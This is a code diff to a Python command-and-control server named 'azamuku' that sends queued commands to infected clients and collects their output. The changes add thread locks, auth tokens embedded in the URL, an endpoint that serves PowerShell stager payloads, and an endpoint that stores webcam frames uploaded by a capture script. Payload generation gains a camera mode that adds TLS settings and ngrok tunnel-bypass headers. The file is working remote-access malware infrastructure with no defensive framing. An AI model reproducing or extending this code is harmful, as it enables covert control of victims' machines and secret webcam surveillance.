@@ -5,6 +5,7 @@ import threading
 import time
 import random
 import os
+import string
 
 """
 written by otter - github.com/whatotter
@@ -25,7 +26,17 @@ activeTunnel = None
 lastSeen = {} # track last seen time for each client - "UID": timestamp
 disconnected = [] # list of UIDs that have disconnected
 client_ips = {} # store recognized IP for each client - "UID": "IP"
+client_hosts = {} # store the Host header used by each client - "UID": "Host"
+stagerPayloads = {} # stager payloads for file-based delivery - "stagerID": "full PS payload"
 
+# Thread locks to prevent race conditions when multiple devices connect simultaneously
+# (especially critical for wired/ethernet connections through a router or switch)
+_connects_lock = threading.Lock()
+_commandPool_lock = threading.Lock()
+_responsePool_lock = threading.Lock()
+_lastSeen_lock = threading.Lock()
+_clientIps_lock = threading.Lock()
+_clientHosts_lock = threading.Lock()
 
 class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
     daemon_threads = True
@@ -43,13 +54,35 @@ class azamukuHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         global authorized, endpoints, commandPool, responsePool, connects, enableGrab, h, lastSeen
-        auth = self.headers.get(h, None)
-        if auth: auth = auth.strip()
+
+        # Handle stager fetch FIRST, before auth prefix stripping.
+        # The cam job fetches /s/<stager_id> with no auth prefix in the path.
+        if self.path.startswith("/s/"):
+            stager_id = self.path[3:]  # strip "/s/"
+            if stager_id in stagerPayloads:
+                ps_code = stagerPayloads[stager_id]
+                self._send_response(200, 'text/plain')
+                self.wfile.write(ps_code.encode('utf-8'))
+                return
+            else:
+                self._send_response(404)
+                self.wfile.write(b'Not Found')
+                return
+
+        # Auth is embedded in URL: /AUTH/path  e.g. /abc123/login or /abc123/e030d4f6
+        parts = self.path.lstrip('/').split('/', 1)
+        if len(parts) == 2:
+            auth = parts[0]
+            self.path = '/' + parts[1]
+        else:
+            auth = self.headers.get(h, None)
+            if auth: auth = auth.strip()
         
 
         # Update last seen time for this client
         if auth and auth in authorized:
-            lastSeen[auth] = time.time()
+            with _lastSeen_lock:
+                lastSeen[auth] = time.time()
             
             # Update client IP
             # Check for proxy headers first (X-Forwarded-For, X-Real-IP)
@@ -64,15 +97,22 @@ class azamukuHandler(BaseHTTPRequestHandler):
             if not client_ip:
                 # Fallback to direct connection IP
                 client_ip = self.client_address[0]
-                
-            client_ips[auth] = client_ip
+
+            with _clientIps_lock:
+                client_ips[auth] = client_ip
+            
+            host_header = self.headers.get('Host')
+            if host_header:
+                with _clientHosts_lock:
+                    client_hosts[auth] = host_header
 
         if self.path == "/e030d4f6":
             if auth in authorized:
-                if auth not in list(connects):
-                    connects.append(auth)
-                    if auth in disconnected:
-                        disconnected.remove(auth)
+                with _connects_lock:
+                    if auth not in connects:
+                        connects.append(auth)
+                        if auth in disconnected:
+                            disconnected.remove(auth)
 
                 self._send_response()
                 a = random.choice(endpoints).encode('ascii')
@@ -81,7 +121,11 @@ class azamukuHandler(BaseHTTPRequestHandler):
             else:
                 if enableGrab and auth:
                     # only append a non-empty auth value
-                    authorized.append(auth)
+                    with _connects_lock:
+                        if auth not in authorized:
+                            authorized.append(auth)
+                        if auth not in connects:
+                            connects.append(auth)
                     self._send_response()
                     a = random.choice(endpoints).encode('ascii')
                     self.wfile.write(a)
@@ -90,6 +134,8 @@ class azamukuHandler(BaseHTTPRequestHandler):
             self._send_response(404)
             self.wfile.write(b'Not Found')
             return
+
+        # (old stager block removed - moved above auth stripping)
             
         # TEMPORARILY DISABLED - hotplug endpoint
         # if self.path == "/hotplug":
@@ -133,26 +179,29 @@ class azamukuHandler(BaseHTTPRequestHandler):
                 return
             else:
                 if auth in authorized:
-                    if auth not in list(connects):
-                        connects.append(auth)
-                        if auth in disconnected:
-                            disconnected.remove(auth)
+                    with _connects_lock:
+                        if auth not in connects:
+                            connects.append(auth)
+                            if auth in disconnected:
+                                disconnected.remove(auth)
 
                     self._send_response()
-                    if auth in list(commandPool):
-                        self.wfile.write(self.alternatingEndpoint("!"+commandPool[auth]))
-                        return
-                    else:
-                        self.wfile.write(self.alternatingEndpoint("*"+random.choice(endpoints)))
-                        return
+                    with _commandPool_lock:
+                        if auth in list(commandPool):
+                            self.wfile.write(self.alternatingEndpoint("!"+commandPool[auth]))
+                            return
+                    self.wfile.write(self.alternatingEndpoint("*"+random.choice(endpoints)))
+                    return
                 else:
                     if not enableGrab:
                         self._send_response(404)
                         self.wfile.write(b'Not Found')
                     else:
-                        connects.append(auth)
-                        if auth in disconnected:
-                            disconnected.remove(auth)
+                        with _connects_lock:
+                            if auth not in connects:
+                                connects.append(auth)
+                            if auth in disconnected:
+                                disconnected.remove(auth)
                         self._send_response()
                         self.wfile.write(self.alternatingEndpoint("*"+random.choice(endpoints))) # make the client rerun the request again
 
@@ -165,13 +214,42 @@ class azamukuHandler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         global authorized, endpoints, commandPool, responsePool, h, lastSeen
-        body = self.rfile.read(int(self.headers['Content-Length'])).decode('ascii')
-        auth = self.headers.get(h, None)
-        
 
+        # Handle camera frame upload FIRST, before auth prefix stripping.
+        # cam_capture.ps1 posts to /c/<uid> with no auth prefix in the path.
+        if self.path.startswith("/c/"):
+            uid = self.path[3:]
+            os.makedirs(os.path.join(".", "core", "camera_frames"), exist_ok=True)
+            frame_path = os.path.join(".", "core", "camera_frames", f"{uid}.jpg")
+            try:
+                content_len = int(self.headers.get('Content-Length', 0))
+                body_bytes = self.rfile.read(content_len)
+                with open(frame_path, "wb") as f:
+                    f.write(body_bytes)
+                self._send_response(200, "text/plain")
+                self.wfile.write(b"OK")
+            except Exception as e:
+                self._send_response(500)
+                self.wfile.write(str(e).encode('ascii'))
+            return
+
+        # Auth embedded in URL: /AUTH/path
+        parts = self.path.lstrip('/').split('/', 1)
+        if len(parts) == 2:
+            auth = parts[0]
+            self.path = '/' + parts[1]
+        else:
+            auth = self.headers.get(h, None)
+            if auth: auth = auth.strip()
+
+
+        body = self.rfile.read(int(self.headers['Content-Length'])).decode('ascii')
+        # auth already set from URL above
+    
         # Update last seen time for this client
         if auth and auth in authorized:
-            lastSeen[auth] = time.time()
+            with _lastSeen_lock:
+                lastSeen[auth] = time.time()
 
             # Update client IP
             # Check for proxy headers first (X-Forwarded-For, X-Real-IP)
@@ -183,8 +261,14 @@ class azamukuHandler(BaseHTTPRequestHandler):
                 
             if not client_ip:
                 client_ip = self.client_address[0]
-                
-            client_ips[auth] = client_ip
+
+            with _clientIps_lock:
+                client_ips[auth] = client_ip
+            
+            host_header = self.headers.get('Host')
+            if host_header:
+                with _clientHosts_lock:
+                    client_hosts[auth] = host_header
 
         if self.path[1:] in endpoints: # if its a *command pool endpoint*
 
@@ -198,12 +282,14 @@ class azamukuHandler(BaseHTTPRequestHandler):
                     ep = random.choice(endpoints).encode('ascii')
                     self.wfile.write(ep)
 
-                    if auth in list(commandPool):
-                        if len(body) != 0:
-                            responsePool[auth] = ''.join([chr(int(x)) for x in body.split(' ')]).strip()
-                        else:
-                            responsePool[auth] = ''
-                        commandPool.pop(auth)
+                    with _commandPool_lock:
+                        if auth in list(commandPool):
+                            with _responsePool_lock:
+                                if len(body) != 0:
+                                    responsePool[auth] = ''.join([chr(int(x)) for x in body.split(' ')]).strip()
+                                else:
+                                    responsePool[auth] = ''
+                            commandPool.pop(auth)
 
                     return
                 else:
@@ -288,6 +374,28 @@ class azamuku:
         self.hotplugServer = None
         pass
 
+    def add_stager(self, ps_code: str) -> str:
+        """Register a PowerShell payload string for file‑based delivery.
+
+        A random 8‑character ID is generated and returned.  The handler
+        in :mod:`azamuku.server` will serve the code when a client requests
+        ``/s/<id>``.
+        """
+        sid = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
+        stagerPayloads[sid] = ps_code
+        return sid
+
+    def remove_stager(self, stager_id: str) -> bool:
+        """Delete a previously registered stager by its ID.
+
+        Returns ``True`` if the entry existed and was removed, otherwise
+        ``False``.
+        """
+        if stager_id in stagerPayloads:
+            del stagerPayloads[stager_id]
+            return True
+        return False
+
     """ HTTP servers. """
     def _run_http(self, ip, server_class=ThreadingHTTPServer, handler_class=azamukuHandler, port=80):
         httpd = server_class((ip, port), handler_class)
@@ -302,6 +410,8 @@ class azamuku:
 
         self.httpsServer = httpd
         httpd.serve_forever()
+
+        
 
     # TEMPORARILY DISABLED - _run_Hotplug method
     # def _run_Hotplug(self, ip, port=7979):
@@ -372,7 +482,7 @@ class payload:
         authorized.append(uid)
         return uid
     
-    def generatePayload(ip, port, payloadFile):
+    def generatePayload(ip, port, payloadFile, camera_mode=False):
         global endpoints
         uid = payload.genUID()
         replaces = {
@@ -385,6 +495,17 @@ class payload:
         payloadData = open(os.path.join("./core/payloads/", payloadFile), "r").read()
         for x,y in replaces.items():
             payloadData = payloadData.replace(x, y)
+            
+        if camera_mode:
+            payloadData = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" + payloadData
+            if 'Invoke-RestMethod' in payloadData and '$headers=@{' in payloadData:
+                header_inject = '$headers=@{'
+                if '"ngrok-skip-browser-warning"' not in payloadData:
+                    header_inject += '"ngrok-skip-browser-warning"="1";'
+                if '"Bypass-Tunnel-Reminder"' not in payloadData:
+                    header_inject += '"Bypass-Tunnel-Reminder"="1";'
+                
+                payloadData = payloadData.replace('$headers=@{', header_inject)
 
         return payloadData
 
@@ -396,13 +517,17 @@ class client:
     def run(self, command:str):
         global commandPool, responsePool, connects
         
-        commandPool[self.uid] = command
+        with _commandPool_lock:
+            commandPool[self.uid] = command
         while True:
-            if self.uid in list(responsePool):
-                response = responsePool[self.uid]
-                responsePool.pop(self.uid)
-                return response
-            elif self.uid not in connects:
+            with _responsePool_lock:
+                if self.uid in list(responsePool):
+                    response = responsePool[self.uid]
+                    responsePool.pop(self.uid)
+                    return response
+            with _connects_lock:
+                still_connected = self.uid in connects
+            if not still_connected:
                 raise ConnectionError("client disconnected")
             else:
                 time.sleep(0.1)
